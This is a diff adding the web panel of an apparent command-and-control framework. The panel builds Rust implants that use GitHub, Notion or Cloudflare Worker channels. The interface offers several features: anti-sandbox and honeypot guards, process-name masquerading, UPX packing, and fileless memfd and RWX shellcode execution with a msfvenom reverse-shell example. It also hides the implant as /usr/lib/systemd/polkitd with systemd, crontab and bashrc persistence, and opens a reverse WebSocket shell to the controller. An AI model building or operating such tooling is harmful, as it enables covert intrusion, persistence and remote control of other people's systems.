+              <label style="font-size:12px" title="Agent Rust 源码所在目录（含 agent/ 子目录）。留空=控制器自身目录。" data-i18n="builder.deployPath">Deploy Path:</label>
+              <input type="text" id="bld-path" placeholder="留空=默认（控制器所在目录）" style="font-family:var(--mono);font-size:11px">
+
+              <label style="font-size:12px">Channel:</label>
+              <select id="bld-channel" onchange="bldChannelChange()" style="width:240px">
+                <option value="github">🐙 GitHub 单通道</option>
+                <option value="notion">📓 Notion 单通道</option>
+                <option value="worker">☁️ Worker 单通道</option>
+                <option value="dual">🔀 双通道（Worker 主 + GitHub 备）</option>
+              </select>
+
+              <div id="bld-token-repo-group" style="display:contents">
+                <label style="font-size:12px" id="bld-token-label">GitHub Token:</label>
+                <input type="password" id="bld-token" placeholder="ghp_xxxx" autocomplete="off">
+
+                <label style="font-size:12px" id="bld-repo-label">Repo (owner/repo):</label>
+                <input type="text" id="bld-repo" placeholder="owner/repo">
+              </div>
+
+              <label style="font-size:12px" title="通信加密 Secret。部署时或 Settings 写过一次即可，编包留空沿用。仅要临时覆盖时才填。">通信 Secret:</label>
+              <input type="password" id="bld-password" placeholder="已写入则留空沿用；仅覆盖时填写" autocomplete="new-password">
+
+              <label style="font-size:12px" title="Token 失效（401）时 Agent 从这里拉新配置 JSON（HMAC 签名），拉到后自动重启换凭据。留空=禁用。">Backup URL:</label>
+              <input type="text" id="bld-backup" placeholder="https://…（可选；Token 失效时拉新配置）">
+
+              <div id="bld-worker-group" style="display:contents">
+                <label style="font-size:12px" id="bld-worker-urls-label">Worker 主 URLs:</label>
+                <input type="text" id="bld-worker-urls" placeholder="https://a.workers.dev（双通道的主通道）" style="font-family:var(--mono);font-size:11px">
+
+                <label style="font-size:12px">Worker Secret:</label>
+                <input type="password" id="bld-worker-secret" placeholder="中继共享密钥" autocomplete="off">
+
+                <label style="font-size:12px">Worker Path:</label>
+                <input type="text" id="bld-worker-path" placeholder="中继 PATH_SECRET（必填，否则 /reg 404）">
+              </div>
+
+              <div id="bld-fo-group" style="display:contents">
+              <label style="font-size:12px" title="双通道（Worker 主 / GitHub 备）：Worker 主通道连续失败多少轮后切到 GitHub 备用">切换阈值 (轮)：</label>
+              <input type="number" id="bld-fo-threshold" value="3" min="2" max="10" style="width:70px">
+
+              <label style="font-size:12px" title="备用连续成功多少轮后探测一次主通道。备用自己也连续失败时会提前探主。">主探测间隔 (轮)：</label>
+              <input type="number" id="bld-fo-probe" value="5" min="2" max="60" style="width:70px">
+              </div>
+
+              <label style="font-size:12px" title="Agent 轮询取命令的间隔。越小响应越快但流量越大；有交互时自动降频，闲置时自动升频。" data-i18n="builder.pollInterval">Poll Interval (s):</label>
+              <input type="number" id="bld-poll" value="30" min="10" style="width:80px">
+
+              <label style="font-size:12px" title="限定 Agent 活跃时段。窗外不发包不执行，像正常下班。两种格式：时间段 09:00-18:00（支持跨夜 22:00-06:00）或小时列表 9,10,11,14。边界自动 ±20min 抖动防指纹。" data-i18n="builder.timeWindow">Time Window:</label>
+              <input type="text" id="bld-window" placeholder="空=全天；如 09:00-18:00 或 9,10,11" style="font-family:var(--mono);font-size:11px">
+
+              <label style="font-size:12px" title="On=Agent 写运行日志到状态目录（排查用）。生产保持 Off——日志文件本身就是指纹。" data-i18n="builder.debug">Debug:</label>
+              <select id="bld-debug" style="width:80px">
+                <option value="0">Off</option>
+                <option value="1">On</option>
+              </select>
+
+              <label style="font-size:12px" title="目标架构/ABI 三元组：musl=静态无 glibc 依赖（最隐蔽，推荐）；gnu=动态链接">架构 (triple)：</label>
+              <select id="bld-arch" style="width:210px">
+                <option value="x86_64-unknown-linux-musl">x86_64 · linux · musl（默认）</option>
+                <option value="aarch64-unknown-linux-musl">aarch64 · linux · musl</option>
+                <option value="x86_64-unknown-linux-gnu">x86_64 · linux · gnu</option>
+                <option value="aarch64-unknown-linux-gnu">aarch64 · linux · gnu</option>
+              </select>
+
+              <label style="font-size:12px" title="发布标识（项 9 版本自上报；空 = 使用构建版本 git 短号）。仅限字母/数字/._:+- 与空格">Release：</label>
+              <input type="text" id="bld-release" placeholder="空=自动取 git 短号" style="width:140px">
+
+            </div>
+            <div id="bld-channel-hint" style="font-size:10px;color:var(--text-muted);line-height:1.6"></div>
+            <details style="margin-top:2px">
+              <summary style="font-size:10px;color:var(--text-muted);cursor:pointer">📖 字段速查</summary>
+              <div style="font-size:10px;color:var(--text-muted);line-height:1.8;margin-top:4px;padding:6px;background:var(--bg-2);border-radius:4px">
+                <b>Time Window</b>：空=全天活跃 · <code>09:00-18:00</code>=时间段（跨夜写 <code>22:00-06:00</code>）· <code>9,10,11,14</code>=指定小时列表。边界自动 ±20min 随机抖动（防定时指纹）。窗外面板显示"安静"（非掉线）。<br>
+                <b>Poll Interval</b>：轮询间隔。30=标准 · 10=最快 · ≥60=省流量。Agent 内置三档自适应（有命令降频、闲置升频）。<br>
+                <b>通信 Secret</b>：控制端↔Agent 的 AES-GCM 加密口令。部署时设过就留空（沿用），仅覆盖时填新值。改了=旧 Agent 全部失联。<br>
+                <b>Backup URL</b>：GitHub Token 被撤销（401）时，Agent 从此地址拉新配置（HMAC 签名防篡改）。留空=禁用。<br>
+                <b>架构</b>：<code>musl</code>=静态链接无 glibc（推荐，兼容 Alpine）· <code>gnu</code>=动态链接（体积小但目标机需 glibc）。<br>
+                <b>Release</b>：自定义版本标签（面板 Agent 详情显示）。空=自动取构建时的 git 短号。<br>
+                <b>Guards</b>（折叠区）：四条激活守卫，全留空=不限制。设了任何一条，不满足时 Agent 静默退出——用于限定只在目标环境运行，防蜜罐/沙箱执行。
+              </div>
+            </details>
+
+            <details style="margin-top:4px">
+              <summary style="font-size:11px;color:var(--text-muted);cursor:pointer" data-i18n="builder.guards">Guards &amp; 伪装定制（可选 OPSEC）</summary>
+              <div class="settings-grid" style="grid-template-columns:auto 1fr;gap:5px 10px;margin-top:6px">
+                <label style="font-size:11px" title="只在指定 hostname 上激活（不匹配=静默退出）。防样本跑到蜜罐/沙箱。留空=不限。">Hostname:</label>
+                <input type="text" id="bld-g-host" placeholder="留空=不限（如 web-prod-01）">
+                <label style="font-size:11px" title="只在以指定用户运行时激活（sudo 提权后自动豁免）。留空=不限。">Username:</label>
+                <input type="text" id="bld-g-user" placeholder="留空=不限（如 root 或 deploy）">
+                <label style="font-size:11px" title="标记文件不存在则静默退出——限定目标环境（如只在装了某软件的机器跑）。留空=不检查。">File Exists:</label>
+                <input type="text" id="bld-g-file" placeholder="留空=不检查（如 /etc/target-marker）">
+                <label style="font-size:11px" title="物理内存低于此值=静默退出。沙箱/容器通常≤2GB；设 4096 可过滤大部分分析环境。">Min Memory MB:</label>
+                <input type="number" id="bld-g-mem" placeholder="0=不检查（建议 4096）" style="width:80px">
+                <label style="font-size:11px" title="ps/top 显示的进程名（comm）">进程伪装名：</label>
+                <input type="text" id="bld-proc-name" placeholder="留空=自动（按发行版伪装为系统守护进程）" maxlength="15">
+                <label style="font-size:11px" title="Agent 二进制重定位的落地路径">落地路径：</label>
+                <input type="text" id="bld-proc-path" placeholder="留空=自动；绝对路径，须非运行中二进制" style="font-family:var(--mono);font-size:11px">
+              </div>
+              <div style="font-size:10px;color:var(--text-muted);margin-top:6px;line-height:1.6">
+                进程名 ≤15 字符（内核 comm 截断）。无文件（memfd）模式下仅进程名生效（无落地文件）。
+                自定义路径若指向运行中的二进制或不可写，构建的 Agent 会自动回退自动模式（不会破坏启动）。
+              </div>
+            </details>
+
+            <div style="display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap">
+              <button class="btn-sm" onclick="bldSave()">💾 保存配置</button>
+              <button class="btn-action btn-success" onclick="bldBuild()" data-i18n="builder.buildBtn">🔨 编译 Agent</button>
+              <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;user-select:none">
+                <input type="checkbox" id="bld-compress">
+                <span data-i18n="builder.compress">Compress (strip + UPX)</span>
+              </label>
+            </div>
+            <div style="font-size:10px;color:var(--text-muted);margin-top:2px">
+              strip: removes debug symbols (~30% smaller, always safe). UPX: packs binary (~60% smaller, requires <code>upx</code> installed).
+            </div>
+
+            <!-- Result -->
+            <div id="bld-result" style="display:none;margin-top:8px;padding:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:6px">
+              <div style="font-size:12px;font-weight:600;margin-bottom:6px">Build Result</div>
+              <div id="bld-result-info" style="font-size:12px;color:var(--text-dim);font-family:var(--mono)"></div>
+              <button id="bld-download-btn" class="btn-sm btn-primary" style="margin-top:8px;display:none" onclick="bldDownload()">⬇ 下载二进制</button>
+            </div>
+
+            <!-- Shellcode / fileless mode -->
+            <details style="margin-top:8px;border:1px solid var(--border);border-radius:6px;background:var(--bg-2)">
+              <summary style="padding:8px 10px;font-size:12px;font-weight:600;cursor:pointer">🧬 Shellcode 模式 — 无文件内存执行 (Linux)</summary>
+              <div style="padding:2px 10px 10px;display:flex;flex-direction:column;gap:8px">
+
+                <!-- A: agent memfd deploy -->
+                <div style="border:1px solid var(--border);border-radius:5px;padding:8px">
+                  <div style="font-size:11px;font-weight:700;margin-bottom:4px">A · Agent 无文件部署（memfd_create + fexecve）</div>
+                  <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;line-height:1.6">
+                    生成一条复制即用的命令，粘贴到目标机 shell 执行：Agent 直接载入内存运行 ——
+                    不落地任何文件、不安装持久化、重启即失效。要求目标机有 python3 ≥ 3.8。
+                  </div>
+                  <button class="btn-sm btn-action" onclick="bldFilelessGen()">🧬 生成部署命令</button>
+                  <span id="bld-fileless-info" style="font-size:10px;color:var(--text-muted);margin-left:8px"></span>
+                  <textarea id="bld-fileless-cmd" readonly rows="4" spellcheck="false"
+                    style="display:none;width:100%;margin-top:6px;font-family:var(--mono);font-size:10px;line-height:1.4;background:#0d1117;color:#c9d1d9;border:1px solid var(--border);border-radius:4px;padding:6px;resize:vertical;white-space:pre-wrap;word-break:break-all"></textarea>
+                  <button id="bld-fileless-copy" class="btn-sm btn-primary" style="display:none;margin-top:4px" onclick="bldCopyText('bld-fileless-cmd')">📋 复制命令</button>
+                </div>
+
+                <!-- B: raw shellcode -->
+                <div style="border:1px solid var(--border);border-radius:5px;padding:8px">
+                  <div style="font-size:11px;font-weight:700;margin-bottom:4px">B · 原生 Shellcode 内存执行（mmap RWX + 跳转）</div>
+                  <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;line-height:1.6">
+                    粘贴 msfvenom 等生成的 shellcode（\xNN / 纯 hex / base64 均可），生成 mmap RWX
+                    直接跳转执行的命令 —— 与 ejecutarShellcode 同一技术，全程无文件落地。
+                    示例：<code style="font-size:9px">msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=y -f c</code>
+                  </div>
+                  <textarea id="bld-sc-input" rows="3" spellcheck="false"
+                    placeholder='\x48\x31\xc0... 或 4831c0... 或 base64'
+                    style="width:100%;font-family:var(--mono);font-size:10px;line-height:1.4;background:#0d1117;color:#c9d1d9;border:1px solid var(--border);border-radius:4px;padding:6px;resize:vertical"></textarea>
+                  <div style="display:flex;gap:6px;margin-top:4px;align-items:center;flex-wrap:wrap">
+                    <button class="btn-sm btn-action" onclick="bldScGen()">⚡ 生成执行命令</button>
+                    <button class="btn-sm" onclick="bldScDemo()" title="写入 PWNED 到 stdout 后正常退出的无害演示 payload">🎲 Demo Payload</button>
+                    <span id="bld-sc-info" style="font-size:10px;color:var(--text-muted)"></span>
+                  </div>
+                  <textarea id="bld-sc-cmd" readonly rows="4" spellcheck="false"
+                    style="display:none;width:100%;margin-top:6px;font-family:var(--mono);font-size:10px;line-height:1.4;background:#0d1117;color:#c9d1d9;border:1px solid var(--border);border-radius:4px;padding:6px;resize:vertical;white-space:pre-wrap;word-break:break-all"></textarea>
+                  <button id="bld-sc-copy" class="btn-sm btn-primary" style="display:none;margin-top:4px" onclick="bldCopyText('bld-sc-cmd')">📋 复制命令</button>
+                </div>
+
+              </div>
+            </details>
+          </div>
+
+          <!-- Right: build output -->
+          <div style="flex:1;display:flex;flex-direction:column;overflow:hidden">
+            <div style="padding:6px 14px;font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid var(--border);background:var(--bg-2);flex-shrink:0">
+              Build Output
+              <span id="bld-elapsed" style="font-weight:400;opacity:.7;margin-left:8px"></span>
+            </div>
+            <pre id="bld-output" style="flex:1;margin:0;padding:12px 16px;overflow:auto;font-family:var(--mono);font-size:11px;line-height:1.5;background:#0d1117;color:#c9d1d9;white-space:pre-wrap;word-break:break-all">Click "Build Agent" to start compilation...</pre>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Upgrade -->
+      <div class="tab-panel" id="panel-upgrade">
+        <div class="panel-toolbar">
+          <span class="panel-title">⬆ Agent 升级</span>
+          <div class="toolbar-right">
+            <span id="upg-agent-indicator" style="font-size:12px;color:var(--text-2)">No agent selected</span>
+          </div>
+        </div>
+        <div style="overflow-y:auto;flex:1;padding:16px 20px 20px">
+
+          <!-- Usage Guide -->
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:20px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:10px;color:var(--accent)">📖 使用说明</div>
+            <div style="font-size:12px;line-height:1.9;color:var(--text-1)">
+              <b>升级流程：</b><br>
+              1. 在左侧选择要升级的 agent<br>
+              2. 在 <b>Builder</b> 标签编译好新版二进制，复制下载链接<br>
+              3. 将链接粘贴到下方 <b>新二进制 URL</b> 输入框<br>
+              4. 点击 <b>Download &amp; Upgrade</b>：agent 会 wget/curl 下载文件并自动替换自身<br>
+              5. Agent 完成替换后重启，约 30-60s 后在控制端重新上线<br><br>
+              <b>升级做了什么：</b><br>
+              • Kill 旧版进程，将新二进制复制到隐藏路径（<code>/usr/lib/systemd/polkitd</code> 等）<br>
+              • 卸载旧版持久化（systemd/crontab/bashrc），重新安装新版<br>
+              • 自动迁移旧版数据（issue ID / agent_id），保持同一 agent 身份<br>
+              • 清理所有用户的旧 bashrc hook（防止 SSH 登录报错）<br><br>
+              <b>注意事项：</b><br>
+              • 仅支持 Linux；Windows agent 升级请手动操作<br>
+              • 新二进制必须与 agent 的加密密码一致，否则无法通信<br>
+              • 升级完成后旧进程退出，controller 约 60s 后重新收到 agent 心跳<br>
+              • 若升级失败（文件损坏/权限不足），旧实例继续运行不受影响
+            </div>
+          </div>
+
+          <!-- Download & Upgrade -->
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:16px">
+            <div style="font-weight:600;font-size:13px;margin-bottom:12px">从 URL 下载并升级</div>
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+              <label style="font-size:12px;color:var(--text-2);white-space:nowrap">新二进制 URL</label>
+              <input type="text" id="upg-url" placeholder="https://your-server.com/github-c2-agent"
+                style="flex:1;font-size:12px;padding:4px 8px;background:var(--bg-1);border:1px solid var(--border);border-radius:4px;color:var(--text-1)">
+            </div>
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+              <label style="font-size:12px;color:var(--text-2);white-space:nowrap">保存到（agent 上）</label>
+              <input type="text" id="upg-dest-path" value="/tmp/.agent_upg"
+                style="width:220px;font-size:12px;padding:4px 8px;background:var(--bg-1);border:1px solid var(--border);border-radius:4px;color:var(--text-1)">
+            </div>
+            <div style="display:flex;gap:8px;align-items:center">
+              <button class="btn-sm btn-primary" onclick="upgDownloadAndUpgrade()">⬇ Download &amp; Upgrade</button>
+              <span id="upg-status" style="font-size:12px;color:var(--text-2)"></span>
+            </div>
+            <div style="margin-top:10px;font-size:11px;color:var(--text-2)">
+              💡 提示：可直接使用 Builder 标签编译后的下载地址（点击 Builder → 编译完成后复制下载链接）
+            </div>
+          </div>
+
+          <!-- Manual Upgrade Command -->
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:16px">
+            <div style="font-weight:600;font-size:13px;margin-bottom:10px">手动发送升级命令</div>
+            <div style="font-size:12px;color:var(--text-2);margin-bottom:8px">
+              如果文件已在 agent 上（通过其他方式上传），可直接发送升级命令：
+            </div>
+            <div style="display:flex;align-items:center;gap:8px">
+              <code style="font-size:12px;background:var(--bg-1);padding:4px 8px;border-radius:4px;border:1px solid var(--border)">upgrade</code>
+              <input type="text" id="upg-manual-path" placeholder="/tmp/github-c2-agent"
+                style="flex:1;font-size:12px;padding:4px 8px;background:var(--bg-1);border:1px solid var(--border);border-radius:4px;color:var(--text-1)">
+              <button class="btn-sm" onclick="upgSendManual()">发送</button>
+            </div>
+            <div style="margin-top:10px;font-size:11px;color:var(--text-2)">
+              Uninstall 命令（卸载并自毁 agent）：
+              <button class="btn-sm btn-danger" onclick="upgUninstall()" style="margin-left:8px">⚠ Uninstall</button>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- WS Shell -->
+      <div class="tab-panel" id="panel-wsshell">
+        <div class="panel-toolbar">
+          <div class="toolbar-left">
+            <span class="panel-title">🔌 反弹 Shell（WS Shell）</span>
+            <span id="wsshell-status-badge" class="wsshell-status-badge">● 已停止</span>
+            <span id="wsshell-server-info" style="font-size:11px;color:var(--text-muted)"></span>
+            <span id="wsshell-agent-indicator" class="agent-indicator"></span>
+          </div>
+          <div class="toolbar-right">
+            <button class="btn-sm btn-primary" id="wsshell-start-btn" onclick="wsshellStartBackend()" title="在控制器本机启动 cliws 监听服务（随包内置）">▶ 启动服务端</button>
+            <button class="btn-sm btn-danger"  id="wsshell-stop-btn"  onclick="wsshellStopBackend()" style="display:none" title="停止控制器本机的 cliws">⏹ 停止服务端</button>
+            <button class="btn-sm btn-warning" id="wsshell-connect-btn" onclick="wsshellConnect()" style="display:none" title="向当前选中 Agent 下发 wspty 反弹命令（内置，无文件落地）">▶ 启动目标端反弹</button>
+            <button class="btn-sm"             id="wsshell-close-btn"   onclick="wsshellClose()"    style="display:none" title="断开反弹会话（Agent 内置 wspty 停止，无需清理文件）">⏹ 停止目标端反弹</button>
+          </div>
+        </div>
+
+        <!-- 架构说明条 -->
+        <div style="padding:6px 16px;background:var(--bg-2);border-bottom:1px solid var(--border);font-size:11px;color:var(--text-muted);line-height:1.7">
+          架构：<b>服务端</b>=控制器本机的 cliws（随部署包内置，无需下载）；
+          <b>目标端</b>=Agent <b>内置</b>的 wspty 反弹节点（点"启动目标端反弹"下发命令即回连，目标机不落地任何文件——因此本页无需清理按钮）。
+          终端经 WebSocket 直达，交互无轮询延迟。
+        </div>
+        <!-- tmux info bar -->
+        <div id="wsshell-tmux-bar" style="display:none;padding:5px 16px;background:#0d1117;border-bottom:1px solid var(--border);font-size:12px;font-family:var(--mono);color:#57ab5a;flex-wrap:wrap;align-items:center;gap:10px">
+          📟 tmux:&nbsp;<code id="wsshell-tmux-name" style="color:#e3b341"></code>
+          &nbsp;&nbsp;
+          <span style="color:#768390">Attach:</span>&nbsp;
+          <code id="wsshell-tmux-attach" style="cursor:pointer;color:#57ab5a" onclick="navigator.clipboard.writeText(this.textContent);toast('Copied','success')" title="点击复制"></code>
+          &nbsp;&nbsp;
+          <span style="color:#768390">Detach:</span>&nbsp;
+          <code style="color:#cdd9e5">Ctrl+b  d</code>
+        </div>
+
+        <!-- Config (collapsible) -->
+        <details id="wsshell-config-details" style="border-bottom:1px solid var(--border)">
+          <summary style="padding:8px 16px;background:var(--bg-2);cursor:pointer;font-size:12px;font-weight:600;color:var(--text-dim);user-select:none">
+            ⚙ WS Shell Config
+          </summary>
+          <div style="padding:10px 16px;background:var(--bg-2);display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap">
+            <div style="display:flex;flex-direction:column;gap:6px">
+              <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+                <label style="font-size:12px;color:var(--text-dim);width:80px">控制端 IP:</label>
+                <input type="text" id="wsshell-ip" placeholder="1.2.3.4" style="width:150px">
+                <label style="font-size:12px;color:var(--text-dim)">端口:</label>
+                <input type="text" id="wsshell-port" value="7337" placeholder="7337" style="width:70px">
+              </div>
+              <div style="display:flex;gap:8px;align-items:center">
+                <button class="btn-sm btn-primary" onclick="wsshellSaveConfig()">💾 保存配置</button>
+                <span style="font-size:11px;color:var(--text-3)">Agent 回连此 IP:端口（需开放防火墙）</span>
+              </div>
+            </div>
+          </div>
+        </details>
+
+        <div style="display:flex;flex-direction:column;flex:1;overflow:hidden">
+
+          <!-- Waiting state -->
+          <div id="wsshell-waiting" class="wsshell-waiting" style="display:none">
+            <div class="wsshell-waiting-icon">⏳</div>
+            <div class="wsshell-waiting-text">等待 Agent 反弹连接…</div>
+            <div id="wsshell-wait-hint" class="wsshell-waiting-hint">
+              命令已发送，Agent 在下次轮询时连接（通常 15–30 s）
+            </div>
+          </div>
+
+          <!-- Terminal (xterm.js, shown when connected) -->
+          <div id="wsshell-term-wrap" style="display:none;flex:1;overflow:hidden;padding:4px">
+            <div id="wsshell-term" style="width:100%;height:100%"></div>
+          </div>
+
+          <!-- Session history — bottom bar, shown only when sessions exist -->
+          <div id="wsshell-history-bar" class="wsshell-history-bar" style="display:none">
+            <span style="white-space:nowrap;color:var(--text-3)">历史会话：</span>
+            <select id="wsshell-sessions" onchange="wsshellLoadSession(this.value)" style="font-size:11px;flex:1;max-width:400px">
+              <option value="">-- 选择查看历史记录 --</option>
+            </select>
+            <button onclick="wsshellBackToLive()" id="wsshell-back-btn" class="btn-sm" style="display:none;font-size:11px">↩ 返回直播</button>
+          </div>
+
+          <!-- Session content viewer — shown below terminal, NOT replacing it -->
+          <div id="wsshell-session-viewer" style="display:none;max-height:320px;overflow:auto;padding:10px 16px;font-family:var(--mono);font-size:12px;white-space:pre;background:var(--code-bg);color:var(--text-1);border-top:1px solid var(--border);flex-shrink:0"></div>
+
+        </div>
+      </div>
+
+      <!-- Settings -->
+      <div class="tab-panel" id="panel-settings">
+        <div class="panel-toolbar"><span class="panel-title">Settings</span></div>
+        <div style="overflow-y:auto;flex:1;padding:0 0 20px">
+          <div class="settings-grid">
+            <label>GitHub Tokens:</label>
+            <div>
+              <div style="display:flex;gap:8px;margin-bottom:6px">
+                <input type="password" id="s-token-input" placeholder="ghp_… (add multiple tokens)" autocomplete="off" style="flex:1;min-width:0">
+                <button class="btn-sm btn-primary" onclick="addToken()">+ Add</button>
+              </div>
+              <div id="s-tokens-list"></div>
+              <div style="font-size:10px;color:var(--text-muted);margin-top:4px">
+                已配置的 token 不回显（只显示末 4 位）。删芯片再保存即移除；新加会追加。全部删掉再保存即清空。多 token 会轮询调用，减轻限额压力。
+              </div>
+            </div>
+
+            <label>控制器解密密码:</label>
+            <div>
+              <input type="password" id="s-password" placeholder="解密 Agent 回包 / 加密下发指令" autocomplete="off">
+              <div class="hint-text">通信加密 Secret。部署时填写会写入数据库，之后编包留空即沿用。Settings 改这里会同步到编包密码。</div>
+            </div>
+
+            <label>Repositories:</label>
+            <div>
+              <div style="display:flex;gap:8px;margin-bottom:8px">
+                <input type="text" id="s-repo-input" placeholder="owner/repo" style="width:260px">
+                <button class="btn-sm btn-primary" onclick="addRepo()">+ Add</button>
+              </div>
+              <div id="s-repos-list"></div>
+            </div>
+
+            <label style="grid-column:1/-1;font-size:13px;font-weight:700;margin-top:12px;padding-top:12px;border-top:2px solid var(--border)">Notion Channel (optional)</label>
+
+            <label>Notion Token:</label>
+            <input type="password" id="s-notion-token" placeholder="ntn_… (Internal Integration Token)" autocomplete="off">
+
+            <label>Notion Databases:</label>
+            <div>
+              <div style="display:flex;gap:8px;margin-bottom:6px">
+                <input type="text" id="s-ndb-input" placeholder="database-id (UUID)" style="width:260px;font-family:var(--mono);font-size:11px">
+                <button class="btn-sm btn-primary" onclick="addNotionDB()">+ Add</button>
+                <button class="btn-sm btn-success" onclick="setupNotionDBs()" title="Add missing columns to configured databases">🔧 Setup Columns</button>
+              </div>
+              <div id="s-ndb-list"></div>
+              <div style="font-size:10px;color:var(--text-muted);margin-top:4px">
+                Paste a Database ID, then click <strong>Setup Columns</strong> to auto-add required fields (safe for existing data).
+              </div>
+            </div>
+
+            <label style="grid-column:1/-1;font-size:13px;font-weight:700;margin-top:12px;padding-top:12px;border-top:2px solid var(--border)">Cloudflare Worker Channel (optional)</label>
+
+            <label>Worker URLs:</label>
+            <input type="text" id="s-worker-urls" placeholder="https://a.workers.dev,https://cdn.example.com" style="font-family:var(--mono);font-size:11px">
+
+            <label>Worker Secret:</label>
+            <input type="password" id="s-worker-secret" placeholder="中继共享密钥" autocomplete="off">
+
+            <label>Worker Path:</label>
+            <div>
+              <input type="text" id="s-worker-path" placeholder="PATH_SECRET（中继强制 /{path}/，空则 404）" style="font-family:var(--mono);font-size:11px">
+              <div class="hint-text">空字段保存时不会覆盖已有值。要清空某项请填单独一个减号 <code>-</code>。</div>
+            </div>
+
+            <label style="grid-column:1/-1;font-size:13px;font-weight:700;margin-top:12px;padding-top:12px;border-top:2px solid var(--border)">General</label>
+
+            <label>Poll Interval (s):</label>
+            <div>
+              <input type="number" id="s-poll" min="10" value="30" style="width:100px">
+              <span class="hint-text">默认 30，与 Agent 编包默认对齐；最低 10</span>
+            </div>
+
+            <label>Comment Limit:</label>
+            <div>
+              <input type="number" id="s-limit" min="0" style="width:100px">
+              <span class="hint-text">保留每台 Agent 最新 N 条通道评论（0=关闭自动清理；填 1–9 会存成 10）</span>
+            </div>
+
+            <label>Stale Days:</label>
+            <div>
+              <input type="number" id="s-stale" min="1" value="7" style="width:100px">
+              <span class="hint-text">自动清理时只删超过 N 天的旧评论</span>
+            </div>
+
+            <label>Web Password:</label>
+            <div>
+              <input type="password" id="s-webpwd" placeholder="留空=不修改；填入则设置新登录密码" autocomplete="new-password" style="width:220px">
+              <div id="s-web-current" style="font-size:11px;color:var(--text-muted);margin-top:4px">当前登录：加载中…</div>
+              <div id="s-always-poll" class="hint-text" style="margin-top:6px"></div>
+            </div>
+
+            <label>Web Username:</label>
+            <input type="text" id="s-webuser" placeholder="Set login username" autocomplete="off">
+          </div>
+
+          <div style="padding:0 24px;display:flex;gap:10px;margin-top:4px">
+            <button class="btn-sm btn-primary" onclick="saveSettings()">💾 保存并连接</button>
+            <button class="btn-sm" onclick="refreshAgents()">🔄 刷新列表</button>
+          </div>
+          <!-- Kill Switch 已按需求移除（防误触全灭）。MCP 的 killswitch 工具仍可用，
+               且需要显式 confirm 确认串，属多步刻意操作。 -->
+          <div id="settings-status" style="padding:8px 24px;font-size:13px"></div>
+
+          <details style="margin:14px 24px;border:1px solid var(--border);border-radius:8px;padding:10px 14px" ontoggle="if(this.open) loadWorkerAdmin()">
+          <summary style="cursor:pointer;font-weight:600">☁️ Cloudflare Worker 中转（一键部署）<span style="font-weight:400;font-size:12px;opacity:.7"> — 填 Token 自动建 D1/上传 Worker/写入渠道配置</span></summary>
+          <div style="margin-top:8px">
+        <div class="panel-toolbar">
+          <span class="panel-title">☁️ Cloudflare Worker 中转</span>
+          <div class="toolbar-right">
+            <span id="wka-status" style="font-size:11px;color:var(--text-muted)"></span>
+          </div>
+        </div>
+        <div style="flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:14px">
+
+          <div style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <div style="font-weight:700;font-size:13px;margin-bottom:8px;color:var(--accent)">🚀 一键部署中转</div>
+            <div style="font-size:12px;line-height:1.8;color:var(--text-1);margin-bottom:10px">
+              填入 Cloudflare API Token，点部署即自动完成：建 D1 数据库 → 建表 → 上传 Worker（含密钥绑定）
+              → 挂每小时清理 cron → 开启 workers.dev，并把中转写入 Settings / Builder <b>备用</b>（不改 Builder 主渠道）。
+            </div>
+            <div class="settings-grid" style="grid-template-columns:auto 1fr auto 1fr;gap:8px 10px;max-width:820px">
+              <label style="font-size:12px">CF API Token:</label>
+              <input type="password" id="wka-token" placeholder="粘贴 Token（首次部署后保存在服务器，回填只需留空）" autocomplete="off" style="grid-column:span 3">
+              <label style="font-size:12px">Worker 名称:</label>
+              <input type="text" id="wka-name" value="c2relay" style="width:140px">
+              <label style="font-size:12px">Auth Secret:</label>
+              <div style="display:flex;gap:6px">
+                <input type="password" id="wka-auth" placeholder="留空=沿用已有" autocomplete="off" style="width:170px">
+                <button class="btn-sm" onclick="wkaGen('wka-auth',16)" title="随机生成">🎲</button>
+              </div>
+              <label style="font-size:12px">Path Secret:</label>
+              <div style="display:flex;gap:6px">
+                <input type="password" id="wka-path" placeholder="留空=沿用已有" autocomplete="off" style="width:170px">
+                <button class="btn-sm" onclick="wkaGen('wka-path',12)" title="随机生成">🎲</button>
+              </div>
+              <label style="font-size:12px">账户 ID:</label>
+              <input type="text" id="wka-account" placeholder="（可选）Token 看不到账户列表时填" style="grid-column:span 3">
+            </div>
+            <div style="display:flex;gap:10px;margin-top:12px;align-items:center">
+              <button class="btn-action btn-success" onclick="wkaDeploy()">🚀 一键部署</button>
+              <label style="font-size:12px;display:flex;gap:4px;align-items:center;cursor:pointer">
+                <input type="checkbox" id="wka-autocfg" checked> 自动写入 Settings
+              </label>
+            </div>
+            <pre id="wka-log" style="display:none;margin-top:10px;padding:12px;background:#0d1117;color:#c9d1d9;border-radius:6px;font-family:var(--mono);font-size:11px;line-height:1.7;max-height:300px;overflow:auto;white-space:pre-wrap"></pre>
+          </div>
+
+          <details style="background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:14px">
+            <summary style="cursor:pointer;font-weight:700;font-size:13px;color:var(--accent)">📖 如何创建 Cloudflare API Token（点击展开）</summary>
+            <div style="font-size:12px;line-height:2;color:var(--text-1);margin-top:8px">
+              1. 打开 <code>https://dash.cloudflare.com/profile/api-tokens</code> → <b>Create Token</b><br>
+              2. 选 <b>Create Custom Token</b>，名称随意（如 c2-deploy），权限按下面 <b>3 条</b> 配置：<br>
